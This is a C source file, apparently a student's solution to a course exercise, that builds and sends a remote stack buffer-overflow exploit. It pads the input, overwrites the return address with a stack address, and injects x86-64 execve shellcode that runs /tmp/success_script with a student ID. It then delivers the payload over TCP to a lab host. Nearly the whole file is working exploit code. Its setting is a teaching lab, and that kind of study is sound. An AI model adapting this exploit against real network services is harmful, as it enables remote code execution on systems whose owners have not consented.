#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define SERVER_IP   "192.168.1.202"
#define SERVER_PORT 12345
#define STUDENT_ID "207807082"
#define SUCCESS_SCRIPT_PATH "/tmp/success_script"

#define QWORD 8
#define BASE_16 16
#define BASE_10 10

static inline void u64_to_le(unsigned char *out, uint64_t v) {
    for (int i = 0; i < QWORD; ++i) {out[i] = (unsigned char) (v & 0xffu);v >>= QWORD;}
}

static const unsigned char SHELLCODE_TEMPLATE[] = {
    0x48, 0xc7, 0xc0, 0x3b, 0x00, 0x00, 0x00, // mov $59, %rax;
    0x48, 0xbf, 0, 0, 0, 0, 0, 0, 0, 0, // movabs PATH, %rdi; placeholder for PATH
    0x48, 0xbe, 0, 0, 0, 0, 0, 0, 0, 0, // movabs ARGV, %rsi; placeholder for ARGV
    0x48, 0x31, 0xd2, // xor %rdx, %rdx;
    0x0f, 0x05 //syscall
};

enum { PATH_IMM_OFFSET = 9, ARGV_IMM_OFFSET = 19 };

static unsigned char *build_payload(uint64_t stack_base, size_t offset,
                                    const char *path_str, const char *id_str,
                                    size_t *out_len) {
    const size_t sc_len = sizeof(SHELLCODE_TEMPLATE);
    const size_t path_len = strlen(path_str) + 1;
    const size_t id_len = strlen(id_str) + 1;

    // calculate memory locations
    const uint64_t shell_addr = stack_base + (uint64_t) offset + QWORD;
    const uint64_t path_addr = shell_addr + sc_len;
    const uint64_t id_addr = path_addr + path_len;
    const uint64_t argv_addr = id_addr + id_len;

    // project payload length and allocate a buffer
    const size_t payload_len = offset + QWORD + sc_len + path_len + id_len + 3 * QWORD;
    unsigned char *buf = (unsigned char *) malloc(payload_len);
    if (!buf) return NULL;

    // add padding and %rip override
    memset(buf, 'A', offset);
    u64_to_le(buf + offset, shell_addr);

    // write shellcode and patch argument addresses
    unsigned char *p = buf + offset + QWORD;
    memcpy(p, SHELLCODE_TEMPLATE, sc_len);
    u64_to_le(p + PATH_IMM_OFFSET, path_addr);
    u64_to_le(p + ARGV_IMM_OFFSET, argv_addr);
    p += sc_len;

    // write path and student id to the end of the payload
    memcpy(p, path_str, path_len);
    p += path_len;
    memcpy(p, id_str, id_len);
    p += id_len;

    // write ARGV pointer at the end of the payload
    u64_to_le(p, path_addr);
    u64_to_le(p + QWORD, id_addr);
    u64_to_le(p + 2 * QWORD, 0);

    *out_len = payload_len;
    return buf;
}

uint64_t parse_address_of_x(const char *arg1) {
    char *end = NULL;
    errno = 0;
    uint64_t address_of_x = strtoul(arg1, &end, BASE_16);
    if (errno || end == arg1) {
        exit(EXIT_FAILURE);
    }
    return address_of_x;
}

uint64_t parse_offset_ret(const char *arg2) {
    char *end = NULL;
    errno = 0;
    size_t x_offset_ret = strtoul(arg2, &end, BASE_10);
    if (errno || end == arg2) {
        exit(EXIT_FAILURE);
    }
    return x_offset_ret;
}

void send_payload(const unsigned char *payload, size_t payload_len) {
    struct sockaddr_in server_addr;

    // initialize server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    if (inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr) <= 0) {
        exit(EXIT_FAILURE);
    }

    // socket create and verification
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        exit(EXIT_FAILURE);
    }

    // connect to server
    if (connect(sockfd, (struct sockaddr *) &server_addr, sizeof(server_addr)) == -1) {
        exit(EXIT_FAILURE);
    }

    // send payload
    send(sockfd, payload, payload_len, 0);
}

int main(int argc, char const *argv[]) {
    if (argc != 3) {
        exit(EXIT_FAILURE);
    }

    const uint64_t address_of_x = parse_address_of_x(argv[1]);
    const uint64_t x_offset_ret = parse_offset_ret(argv[2]);

    // Construct payload
    size_t payload_len;
    const unsigned char *payload = build_payload(address_of_x, x_offset_ret,
                                                 SUCCESS_SCRIPT_PATH,
                                                 STUDENT_ID, &payload_len);
    if (!payload) {
        exit(EXIT_FAILURE);
    }

    send_payload(payload, payload_len);
    free((void*)payload);
    exit(EXIT_SUCCESS);
}
